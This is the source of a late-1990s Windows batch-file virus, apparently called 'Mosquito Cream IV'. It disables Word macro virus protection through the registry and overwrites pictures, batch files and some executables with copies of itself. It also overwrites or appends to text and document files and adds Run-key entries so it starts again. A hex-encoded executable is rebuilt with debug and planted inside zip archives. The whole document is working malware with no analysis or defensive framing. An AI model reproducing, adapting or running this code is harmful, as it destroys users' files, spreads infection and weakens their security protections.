@cls 
@echo off
:: MO§QUITO CREAM IV By StRaMoNiUm
@break off
ECHO REGEDIT4>%windir%\BZz.reg
ECHO.>>%windir%\BZz.reg
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>%windir%\BZz.reg
ECHO "RegisteredOwner"="MO§QUITO CREAM IV">>%windir%\BZz.reg
ECHO "RegisteredOrganization"="By StRaMoNiUm©">>%windir%\BZz.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>%windir%\BZz.reg
ECHO "EnableMacroVirusProtection"="0">>%windir%\BZz.reg
@REGEDIT /S /C %windir%\BZz.reg
@attrib %windir%\*.* -h -r -s
@attrib %windir%\Desktop\*.* -h -r -s
@attrib %windir%\web\*.* -h -r -s
@attrib C:\Docume~1\*.* -h -r -s
for %%i in (%windir%\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (%windir%\Desktop\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (%windir%\Desktop\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (%windir%\WEB\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\WEB\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (C:\Docume~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (C:\Docume~1\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (C:\Mydocu~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (C:\Mydocu~1\*.gif,*.jpg) do ren %%i *.bmp>nul
echo    MOSQUITO CREAM  IV       >x
echo.                           >>x 
echo               \\           >>x
echo             OooO@-         >>x
echo               //           >>x
echo.                           >>x
echo  # ITALIAN PRODUCTION 1999 #         By StRaMoNiUm>>x
@move x %tmp%\x
@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip
:BuZZ
@move Bz.Z %tmp%\Setup.exe>nul
@copy %0 %tmp%\Setup.BMP>nul
@if exist Pkzip.exe goto :Bzext
@if not exist Pkzip.exe goto :BzrZ
:Bzext
for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.exe>nul
for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.BMP>nul
goto :BZskip
:BzrZ
for %%i in (*.zip ..\*.zip) do start /m winzip32 -a /%%i "%tmp%\Setup.exe" "%tmp%\Setup.BMP">nul
goto :BZskip
:BZskip
for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %tmp%\x %%i>nul
cd..
@attrib *.* -h -r -s
for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %%i+%tmp%\x %%i>nul
@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip2
:BZskip2
@REGEDIT /E %windir%\BZs.reg HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO "0A StRaMoNiUm"="c:\\command /C ren C:\\Mosquito.bmp Mosquito.bat|CLS">>%windir%\BZs.reg
ECHO "1A Dark_Elf"="start /m C:\\Mosquito.bat">>%windir%\BZs.reg
echo.
echo jgcxjhgkjhcxgkjdhflkgjhxhjxhjjjhjkfjjkhjhjfjjhjjhj>nul
echo.
echo ciyjouigydujujhgfkjbkjhgdkjhgjhjugkjghkdjhykugrhtiug>nul
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1>nul
echo.
@regedit /S /C %windir%\BZs.reg
@cls
@type %tmp%\x
for %%i in (%tmp%\*.*) do DEL %%i>nul
@copy %0 c:\MOSQUITO.BMP>nul
@copy %0 %windir%\DVC.EXE>nul
ECHO @Echo off>%windir%\WIN.BAT
ECHO @if exist c:\Mosquito.bat goto :BZ>>%windir%\WIN.BAT
ECHO @if not exist c:\Mosquito.bat goto :BZXT
ECHO :BZXT>>%windir%\WIN.BAT
ECHO @ren DVC.EXE BZz.bat>>%windir%\WIN.BAT
ECHO @copy BZz.bat DVC.EXE>>%windir%\WIN.BAT
ECHO @start /m BZz.bat>>%windir%\WIN.BAT
ECHO :BZ>>%windir%\WIN.BAT
ECHO CLS>>%windir%\WIN.BAT
ren %0 Mosquito.BMP|cls
exit
:BZzip
ECHO n BZ.Z>%tmp%\bzz.z
ECHO e 100 4D 5A E2 01 02 00 00 00 02 00 C3 0F FF FF F0 FF>>%tmp%\bzz.z
ECHO e 110 FE FF 00 00 00 01 F0 FF 1C 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO e 120 FC BD 20 01 8B 6E 00 8B A6 02 00 8B 9E 04 00 B4>>%tmp%\bzz.z
ECHO e 130 4A CD 21 A1 2C 00 89 86 1A 00 8B 9E 00 00 FF E3>>%tmp%\bzz.z
ECHO e 140 40 04 C7 86 10 00 FF FF 8B D6 33 C9 B8 02 3C 0B>>%tmp%\bzz.z
ECHO e 150 FF 74 02 FE C4 CD 21 72 29 8B D8 0B FF 74 0B B8>>%tmp%\bzz.z
ECHO e 160 02 42 33 D2 8B CA CD 21 72 18 89 9E 12 00 53 B4>>%tmp%\bzz.z
ECHO e 170 45 BB 01 00 CD 21 89 86 10 00 B9 01 00 5B B4 46>>%tmp%\bzz.z
ECHO e 180 CD 21 C3 84 01 FE 01 53 E8 00 00 5B 8B FE 4F 1E>>%tmp%\bzz.z
ECHO e 190 8A 86 1E 00 50 FF 57 FA 2E FF 57 F8 58 88 86 1E>>%tmp%\bzz.z
ECHO e 1A0 00 1F 5B C3 53 E8 20 00 00 44 55 4D 4D 59 20 20>>%tmp%\bzz.z
ECHO e 1B0 20 46 43 42 00 00 00 00 00 44 55 4D 4D 59 20 20>>%tmp%\bzz.z
ECHO e 1C0 20 46 43 42 00 00 00 00 5B 1E 06 89 A6 02 00 57>>%tmp%\bzz.z
ECHO e 1D0 56 8B F7 46 8D 3F B8 03 29 CD 21 8D 7F 10 B8 03>>%tmp%\bzz.z
ECHO e 1E0 29 CD 21 5E 5F 0E 8D 57 10 52 0E 8D 17 52 0E 57>>%tmp%\bzz.z
ECHO e 1F0 2E A1 2C 00 50 8B DC B8 00 4B 8B D6 CD 21 BD 20>>%tmp%\bzz.z
ECHO e 200 01 2E 8B 6E 00 8C CB FA 8E D3 8B A6 02 00 FB FC>>%tmp%\bzz.z
ECHO e 210 07 1F B4 4D CD 21 88 86 1E 00 5B C3 14 02 53 E8>>%tmp%\bzz.z
ECHO e 220 07 00 43 4F 4D 53 50 45 43 5B BA 07 00 8B F3 FF>>%tmp%\bzz.z
ECHO e 230 57 FA 5B C3 53 51 57 06 8E 86 1A 00 33 FF 8B DE>>%tmp%\bzz.z
ECHO e 240 8B F3 8B CA F3 A6 74 14 32 C0 B9 FF FF F2 AE 26>>%tmp%\bzz.z
ECHO e 250 80 3D 00 75 EB 8B F7 06 1F F9 EB 19 8B F7 06 1F>>%tmp%\bzz.z
ECHO e 260 AC 3C 3D 75 FB 80 3C 00 74 EB AC 0A C0 72 04 3C>>%tmp%\bzz.z
ECHO e 270 20 72 F7 4E F8 07 5F 59 5B C3 83 BE 10 00 FF 74>>%tmp%\bzz.z
ECHO e 280 13 B4 46 8B 9E 10 00 B9 01 00 CD 21 B4 3E 8B 9E>>%tmp%\bzz.z
ECHO e 290 12 00 CD 21 C3 67 01 D8 03 E8 03 84 01 2B 04 53>>%tmp%\bzz.z
ECHO e 2A0 E8 32 00 00 50 41 54 48 3D 43 4F 4D 45 58 45 42>>%tmp%\bzz.z
ECHO e 2B0 41 54 00 00 00 00 42 61 64 20 63 6F 6D 6D 61 6E>>%tmp%\bzz.z
ECHO e 2C0 64 20 6F 72 20 66 69 6C 65 20 6E 61 6D 65 0D 0A>>%tmp%\bzz.z
ECHO e 2D0 00 2F 43 20 00 5B 89 77 0F 89 7F 11 8B 96 0A 00>>%tmp%\bzz.z
ECHO e 2E0 83 C2 04 C6 47 31 00 C6 07 00 8B FA 33 C9 0A 0F>>%tmp%\bzz.z
ECHO e 2F0 75 73 52 56 33 D2 80 7C 01 3A 75 0D 8A 14 80 E2>>%tmp%\bzz.z
ECHO e 300 DF 80 EA 40 A5 83 47 0F 02 80 3C 5C 74 1C B0 5C>>%tmp%\bzz.z
ECHO e 310 AA 56 8B F7 B4 47 CD 21 5E 32 C0 B9 40 00 F2 AE>>%tmp%\bzz.z
ECHO e 320 4F 80 7D FF 5C 74 03 B0 5C AA 33 C0 AC 3D 2E 2E>>%tmp%\bzz.z
ECHO e 330 75 0E FD B0 5C B9 12 00 F2 AE F2 AE FC 47 EB EC>>%tmp%\bzz.z
ECHO e 340 AA 8A E0 3C 5C 75 03 FE 47 31 3C 00 75 DE 4F 8B>>%tmp%\bzz.z
ECHO e 350 D7 FD B9 05 00 B0 2E F2 AE FC 75 03 47 8B D7 8B>>%tmp%\bzz.z
ECHO e 360 FA 5E 5A EB 25 80 7F 31 00 75 08 8B 77 0F FF 57>>%tmp%\bzz.z
ECHO e 370 F6 73 08 8D 77 13 FF 57 F4 EB 7B B9 49 00 AC 3C>>%tmp%\bzz.z
ECHO e 380 20 76 07 3C 2E 74 03 AA E2 F4 B0 2E AA 8D 77 06>>%tmp%\bzz.z
ECHO e 390 B9 03 00 A5 A4 32 C0 AA 52 56 51 8B F2 FF 57 FA>>%tmp%\bzz.z
ECHO e 3A0 59 5E 5A 73 0A 83 EF 04 E2 E9 FE 07 E9 3B FF 83>>%tmp%\bzz.z
ECHO e 3B0 F9 01 75 33 8D 77 2E 83 EA 03 8B FA A5 A4 32 C0>>%tmp%\bzz.z
ECHO e 3C0 B9 FC 00 F2 AE C6 45 FF 20 8B 77 11 38 4C FF 77>>%tmp%\bzz.z
ECHO e 3D0 03 8A 4C FF F3 A4 C6 05 0D 8B F2 8B C7 2B C2 88>>%tmp%\bzz.z
ECHO e 3E0 44 FF FF 57 F2 EB 0F 8B 7F 11 4F FE 0D 57 8B F2>>%tmp%\bzz.z
ECHO e 3F0 FF 57 F8 5F FE 05 5B C3 8A 14 46 0A D2 74 06 B4>>%tmp%\bzz.z
ECHO e 400 02 CD 21 EB F3 C3 14 02 53 E8 04 00 50 41 54 48>>%tmp%\bzz.z
ECHO e 410 5B 52 56 1E BA 04 00 8B F3 FF 57 FA 49 E3 0B AC>>%tmp%\bzz.z
ECHO e 420 0A C0 74 24 3C 3B 75 F7 EB F2 AC 3C 3B 74 07 0A>>%tmp%\bzz.z
ECHO e 430 C0 74 03 AA EB F4 0E 1F 26 80 7D FF 5C 74 03 B0>>%tmp%\bzz.z
ECHO e 440 5C AA F8 1F 5E 5A 5B C3 F9 EB F8 8B D7 B4 1A CD>>%tmp%\bzz.z
ECHO e 450 21 8B D6 33 C9 B4 4E CD 21 72 04 83 C7 1E F8 C3>>%tmp%\bzz.z
ECHO e 460 96 04 C2 06 AD 00 C4 06 C5 07 C6 08 C7 09 56 E8>>%tmp%\bzz.z
ECHO e 470 7F 2D 83 C6 04 5F 8B 0E 44 D7 83 E9 04 F3 00 00>>%tmp%\bzz.z
ECHO e 480 6E 75 6C 00 20 2F 43 20 52 45 4E 20 73 65 74 75>>%tmp%\bzz.z
ECHO e 490 70 2E 62 6D 70 20 49 6E 73 74 61 6C 6C 2E 62 61>>%tmp%\bzz.z
ECHO e 4A0 74 20 20 20 20 0D 00 49 4E 53 54 41 4C 4C 2E 62>>%tmp%\bzz.z
ECHO e 4B0 61 74 00 01 0D 00 8D B6 20 00 BF 00 00 B8 22 01>>%tmp%\bzz.z
ECHO e 4C0 FF D0 8D B6 25 00 B8 67 01 FF D0 B8 5A 02 FF D0>>%tmp%\bzz.z
ECHO e 4D0 8D B6 47 00 8D BE 54 00 B8 7F 02 FF D0 B8 00 4C>>%tmp%\bzz.z
ECHO e 4E0 CD 21 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO e 500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO rcx>>%tmp%\bzz.z
ECHO 410>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO w>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO q>>%tmp%\bzz.z
debug < %tmp%\bzz.z>nul
goto :BuZZ
